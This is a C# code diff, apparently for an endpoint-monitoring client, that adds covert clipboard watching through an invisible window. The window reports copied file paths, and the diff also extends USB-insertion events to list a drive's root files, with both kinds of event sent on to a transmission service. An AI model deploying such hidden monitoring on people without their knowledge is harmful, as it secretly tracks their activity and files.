@@ -24,7 +24,12 @@ public class SystemMonitorService : ISystemMonitorService
     private Task? _telegramMonitorTask;
     private readonly Dictionary<string, DateTime> _blockedChats = new();
 
+    private Thread? _clipboardThread;
+    private ClipboardMonitorForm? _clipboardForm;
+
     public event EventHandler<SystemEvent>? SystemEventOccurred;
+
+    private readonly IDataTransmissionService _transmission;
 
     public SystemMonitorService(
         ILogger<SystemMonitorService> logger,
@@ -35,8 +40,6 @@ public class SystemMonitorService : ISystemMonitorService
         _settings = settings.Value;
         _transmission = transmission;
     }
-
-    private readonly IDataTransmissionService _transmission;
 
     public async Task StartAsync(CancellationToken cancellationToken)
     {
@@ -59,6 +62,9 @@ public class SystemMonitorService : ISystemMonitorService
                 _ = Task.Run(MonitorNetworkActivity, _cancellationTokenSource.Token);
             }
 
+            // Start Clipboard Monitoring
+            StartClipboardMonitoring();
+
             _telegramMonitorTask = Task.Run(MonitorTelegramChats, _cancellationTokenSource.Token);
 
             _logger.LogInformation("System monitoring started");
@@ -80,6 +86,8 @@ public class SystemMonitorService : ISystemMonitorService
         _usbWatcher?.Stop();
         _usbWatcher?.Dispose();
         
+        StopClipboardMonitoring();
+
         _logger.LogInformation("System monitoring stopped");
         await Task.CompletedTask;
     }
@@ -95,6 +103,88 @@ public class SystemMonitorService : ISystemMonitorService
                 .OrderByDescending(e => e.Timestamp)
                 .ToList();
             return Task.FromResult(list);
+        }
+    }
+
+    private void StartClipboardMonitoring()
+    {
+        try
+        {
+            _clipboardThread = new Thread(() =>
+            {
+                try
+                {
+                    _clipboardForm = new ClipboardMonitorForm(this);
+                    Application.Run(_clipboardForm);
+                }
+                catch (Exception ex)
+                {
+                    _logger.LogError(ex, "Error in clipboard monitor thread");
+                }
+            });
+            _clipboardThread.SetApartmentState(ApartmentState.STA);
+            _clipboardThread.IsBackground = true;
+            _clipboardThread.Start();
+            _logger.LogInformation("Clipboard monitoring started");
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "Failed to start clipboard monitoring");
+        }
+    }
+
+    private void StopClipboardMonitoring()
+    {
+        try
+        {
+            if (_clipboardForm != null && !_clipboardForm.IsDisposed)
+            {
+                if (_clipboardForm.InvokeRequired)
+                {
+                    _clipboardForm.Invoke(new Action(() => _clipboardForm.Close()));
+                }
+                else
+                {
+                    _clipboardForm.Close();
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "Error stopping clipboard monitoring");
+        }
+    }
+
+    internal void OnClipboardFilesCopied(System.Collections.Specialized.StringCollection files)
+    {
+        try
+        {
+            var fileList = new List<string>();
+            foreach (var f in files)
+            {
+                if (f != null) fileList.Add(f);
+            }
+
+            if (fileList.Count == 0) return;
+
+            var displayFiles = string.Join(", ", fileList.Take(5));
+            if (fileList.Count > 5) displayFiles += $"... (and {fileList.Count - 5} more)";
+
+            var ev = new SystemEvent
+            {
+                Timestamp = DateTime.Now,
+                EventType = SystemEventType.ClipboardFileCopy,
+                Description = $"Клиент {_settings.ClientId} скопировал файлы в буфер обмена: {displayFiles}",
+                AdditionalData = new Dictionary<string, object> { ["Files"] = fileList }
+            };
+
+            AddEvent(ev);
+            SystemEventOccurred?.Invoke(this, ev);
+            _ = _transmission.SendSystemEventAsync(ev);
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "Error processing clipboard event");
         }
     }
 
@@ -376,18 +466,65 @@ public class SystemMonitorService : ISystemMonitorService
     {
         try
         {
-            var driveName = e.NewEvent["DriveName"]?.ToString() ?? "Unknown";
+            var driveName = e.NewEvent["DriveName"]?.ToString();
+            if (string.IsNullOrEmpty(driveName)) return;
+            
+            // Format drive name for DriveInfo (needs "E:\" or "E:")
+            // Win32_VolumeChangeEvent returns "E:"
+            var drivePath = driveName.EndsWith(":") ? driveName + "\\" : driveName;
+            if (!drivePath.EndsWith("\\")) drivePath += "\\";
+
+            string details = $"Drive: {driveName}";
+            var additional = new Dictionary<string, object>();
+            
+            try 
+            {
+                var di = new DriveInfo(driveName);
+                // Check if ready
+                if (di.IsReady)
+                {
+                    details += $", Label: {di.VolumeLabel}, Format: {di.DriveFormat}, Size: {di.TotalSize}, Free: {di.TotalFreeSpace}";
+                    additional["VolumeLabel"] = di.VolumeLabel;
+                    additional["TotalSize"] = di.TotalSize;
+                    additional["TotalFreeSpace"] = di.TotalFreeSpace;
+                    additional["DriveFormat"] = di.DriveFormat;
+
+                    // List root files (limit to first 50)
+                    var rootFiles = di.GetFiles().Take(50).Select(f => f.Name).ToList();
+                    additional["RootFiles"] = rootFiles;
+                    
+                    if (rootFiles.Count > 0)
+                    {
+                        details += $", Files (first {rootFiles.Count}): {string.Join(", ", rootFiles)}";
+                    }
+                    else
+                    {
+                        details += ", Files: (empty or none found)";
+                    }
+                }
+                else
+                {
+                    details += " (Device not ready)";
+                }
+            } 
+            catch (Exception ex) 
+            {
+                details += $", InfoError: {ex.Message}";
+            }
 
             var systemEvent = new SystemEvent
             {
                 Timestamp = DateTime.Now,
                 EventType = SystemEventType.USBConnected,
-                Description = $"Клиент {_settings.ClientId} подключил USB-устройство: {driveName}",
-                DeviceId = driveName
+                Description = $"Клиент {_settings.ClientId} подключил USB-устройство: {details}",
+                DeviceId = driveName,
+                AdditionalData = additional
             };
 
             AddEvent(systemEvent);
             SystemEventOccurred?.Invoke(this, systemEvent);
+            // Send immediately
+            _ = _transmission.SendSystemEventAsync(systemEvent);
         }
         catch (Exception ex)
         {
@@ -458,5 +595,86 @@ public class SystemMonitorService : ISystemMonitorService
                 _recentEvents.RemoveRange(0, 50);
             }
         }
+    }
+
+    // Nested class for Clipboard Monitoring
+    private class ClipboardMonitorForm : Form
+    {
+        private SystemMonitorService _service;
+        private IntPtr _nextClipboardViewer;
+
+        public ClipboardMonitorForm(SystemMonitorService service)
+        {
+            _service = service;
+            this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.Opacity = 0;
+            
+            this.Load += (s, e) =>
+            {
+                _nextClipboardViewer = SetClipboardViewer(this.Handle);
+            };
+            
+            this.FormClosing += (s, e) =>
+            {
+                ChangeClipboardChain(this.Handle, _nextClipboardViewer);
+            };
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            // WM_DRAWCLIPBOARD
+            const int WM_DRAWCLIPBOARD = 0x0308;
+            // WM_CHANGECBCHAIN
+            const int WM_CHANGECBCHAIN = 0x030D;
+
+            switch (m.Msg)
+            {
+                case WM_DRAWCLIPBOARD:
+                    CheckClipboard();
+                    SendMessage(_nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                    break;
+
+                case WM_CHANGECBCHAIN:
+                    if (m.WParam == _nextClipboardViewer)
+                        _nextClipboardViewer = m.LParam;
+                    else
+                        SendMessage(_nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                    break;
+
+                default:
+                    base.WndProc(ref m);
+                    break;
+            }
+        }
+
+        private void CheckClipboard()
+        {
+            try
+            {
+                if (Clipboard.ContainsFileDropList())
+                {
+                    var files = Clipboard.GetFileDropList();
+                    if (files.Count > 0)
+                    {
+                        _service.OnClipboardFilesCopied(files);
+                    }
+                }
+            }
+            catch 
+            {
+                // Clipboard access can fail if locked by another process
+            }
+        }
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
+
+        [DllImport("user32.dll")]
+        private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
     }
 }
